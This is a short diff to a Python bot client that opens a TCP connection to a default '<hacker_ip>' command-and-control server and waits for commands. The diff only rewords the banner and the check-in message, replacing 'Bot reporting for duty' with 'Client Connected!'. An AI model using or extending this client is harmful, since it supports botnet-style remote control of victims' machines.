@@ -17,7 +17,7 @@ from socket import *
 serverName = sys.argv[1] if len(sys.argv) > 1 else '<hacker_ip>' # Use CNC (server) ip by default
 serverPort = sys.argv[2] if len(sys.argv) > 2 else 8000 # Use port 8000 by default
 
-print("SERVER: {} PORT: {}".format(serverName,serverPort) ) 
+print("[CONNECTED] SERVER: {} PORT: {}".format(serverName,serverPort) ) 
 
 # Create client IPv4 (AF_INET) TCPSocket (SOCK_STREAM)
 clientSocket = socket(AF_INET, SOCK_STREAM)
@@ -30,7 +30,7 @@ clientSocket.connect((serverName,serverPort))
 
 # Send message to server (hacker) that we're ready 
 # Must encode msg as python socket library accepts/sends binary
-clientSocket.send('Bot reporting for duty'.encode())
+clientSocket.send('Client Connected!'.encode())
 
 # Accept/decode any initial messages (commands) from server (max 4064 bytes)
 command = clientSocket.recv(4064).decode()
